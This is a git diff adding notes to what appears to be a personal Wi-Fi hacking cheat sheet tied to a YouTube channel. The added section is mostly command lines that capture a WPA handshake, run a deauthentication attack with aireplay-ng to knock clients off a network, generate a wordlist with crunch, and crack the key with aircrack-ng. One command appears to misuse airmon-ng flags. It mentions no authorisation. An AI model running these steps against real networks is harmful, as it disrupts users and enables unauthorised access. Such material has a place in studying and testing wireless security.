@@ -507,12 +507,29 @@ reaver --bssid @1 --channel @2 --interface wlan1 -vvv --no-associate
 ```
 
 ---
+# WPA Handshake Capture
+```
+airmon-ng --bssid @ --channel @ --write wpa_handshake wlan1
+```
+>[!NOTE]\
+>Handshake is captured only when new client is connected. we can't wait so use de-authentication attack `parlelly`.
 
-# 3. Post-Connection Attack
+### De-authentication attack
+```
+aireplay-ng --deauth 4 -a @ -c @ wlan1
+```
+### create word list
+```
+man crunch
+crunch 6 8 {key length} abc12 {char used} -o test.txt
+```
+create word list using pattern
+```
+crunch 6 8 {key length} abc12 {char used} -o test.txt -t a@@@@b
+```
 
-<details>
-    <summary></summary>
-
-</details>
-
-# ===}> [Keep Supporting me on YouTube ][def]
+### Crack WPA-key using handshake file
+```
+aircrack-ng wpa_handshake-01.cap -w test.txt
+```
+# ===}> [Keep Supporting me on YouTube :yt: ](https://www.youtube.com/@ohm_vishwa)
